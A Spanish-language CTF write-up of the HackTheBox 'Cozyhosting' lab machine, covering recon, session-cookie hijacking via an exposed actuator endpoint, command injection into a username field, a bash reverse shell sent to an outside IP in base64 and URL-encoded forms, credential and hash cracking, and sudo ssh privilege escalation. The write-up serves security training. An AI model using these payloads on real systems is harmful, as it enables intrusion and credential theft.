---
redirect_from:
  - /posts/COZYHOSTING-WriteUp/

title: "Cozyhosting - WriteUp"
date: Fri Sep 20 2024 20:00:00 GMT+0200 (Central European Summer Time)
categories: [WriteUps, HTB, Linux]
tags: [ctf, nmap, htb, dirb, john, sudo, wfuzz, nginx, linux, ssh]
image: /assets/img/htb-writeups/Pasted-image-20231125122042.png
---

{% include machine-info.html
  machine="Cozyhosting"
  os="Linux"
  difficulty="Easy"
  platform="HTB"
%}

![Cozyhosting](/assets/img/htb-writeups/Pasted-image-20231125122042.png)

------

Máquina Linux

NMAP

```bash
# Nmap 7.94SVN scan initiated Sat Nov 25 12:02:40 2023 as: nmap -sCV -p 22,80 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oN targeted -oX targetedXML 10.129.234.48
Nmap scan report for 10.129.234.48
Host is up (0.057s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cozyhosting.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Virtual Hosting a puntando a "cozyhosting.htb", actualizamos archivo hosts y seguimos...

HTTP

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125122042.png)

Login en http://cozyhosting.htb/login

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125124035.png)

FUZZING

```bash
$ wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 --hh 12706 -t 500 http://cozyhosting.htb/FUZZ
```

```bash
$ dirsearch -u http://cozyhosting.htb
```

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125131850.png)

Encuentra lago interesante, vamos a ver qué es:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125131935.png)

Entramos en http://cozyhosting.htb/actuator/sessions para echar un vistazo y vemos esto:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125132148.png)

Vamos a capturar el login con _BurpSuite_ y usar la cookie del usuario _kanderson_

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125132547.png)

O también podemos usarla desde el navegador Firefox:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125132819.png)

La cambiamos por la que acabamos de descubrir, pulsamos intro, refrescamos al página y para adentro!

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125133014.png)

Nos fijamos en la parte baja de la página donde dice esto.

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125133231.png)

Vamos a capturar la petición de nuevo con _BurpSuite_

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125134016.png)

Vemos algo interesante en la respuesta, necesitamos saber cómo enviarle un comando de consola remota que ejecutará con "/bin/bash/ -c"

Nos ponemos en escucha para las pruebas:

```bash
$ nc -nlvp 9001
```

Y ahora vamos a probar payloads de diferentes formas hasta que demos con la tecla...

Después de hacer varias pruebas y consultar varias webs, encontramos el payload correcto que pondremos en el campo _username_:

```bash
;echo${IFS%??}"<payload>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

Codificaremos la parte de ejecución de comando con base64 que será la parte del comando de siempre que nos envía la shel remota:

```bash
$ echo -n "bash -i >& /dev/tcp/10.10.16.25/9001 0>&1" | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS85MDAxIDA+JjE=
```

Una vez tenemos las dos partes las juntamos en una única línea y la pegamos en _BurpSuite_:

```bash
username=;echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4yNS85MDAxIDA+JjE="${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

Ahora seleccionamos toda la línea del payload, botón secundario del ratón Convert selection > URL > URL-encode key characters.

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125140509.png)

Quedando así:

```HTTP
%3becho${IFS%25%3f%3f}"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMC4xMC4xNi4yNS85MDAxIDA%2bJjE%3d"${IFS%25%3f%3f}|${IFS%25%3f%3f}base64${IFS%25%3f%3f}-d${IFS%25%3f%3f}|${IFS%25%3f%3f}bash%3b
```

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125140630.png)

Le damos a "Send"

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125140758.png)

Estamos dentro, sanitizamos terminal y continuamos.

Usuarios:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125151239.png)

Vemos un archivo nada más entrar que nos llama la atención. Como tenemos python en la máquina, levantaremos un servidor HTTP para servir el archivo y traerlo a nuestra máquina:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125141553.png)

```bash
$ wget 10.129.234.48:4444/cloudhosting-0.0.1.jar
```

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125141727.png)

Vamos a abrir el archivo .jar con _jd-gui_ para ver qué contiene.

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125145714.png)

Encontramos unas credenciales para el servidor postgres

```http
postgres:Vg&nvzAQ7XxR
```

Conectamos con las credenciales obtenidas:

```bash
$ psql -h 127.0.0.1 -U postgres
```

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125150305.png)

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125150532.png)

Tenemos dos hashes. Nos lo copiamos y llamamos a nuestro amigo _John_ de confianza...

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes
```

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125150846.png)

Encontramos las credenciales para el usuario admin

```http
admin:manchesterunited
```

Con las credenciales que tenemos vamos a intentar validarlas contra el otro usuario que encontramos, _josh_:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125151407.png)

Y funciona!

Registramos primera bandera y seguimos...

Al poner "sudo -l" vemos esto:

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125162815.png)

Puede ejecutar con permisos de root sudo. Buscamos en GTFObins https://gtfobins.github.io/gtfobins/ssh/#sudo

Escribimos el comando que nos díce la página y escalamos a root fácilmente.

```bash
$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

![COZYHOSTING](/assets/img/htb-writeups/Pasted-image-20231125163115.png)
---

**Última actualización**: 2024-09-20<br>
**Autor**: A. Lorente<br>
**Licencia**: Creative Commons BY-NC-SA 4.0
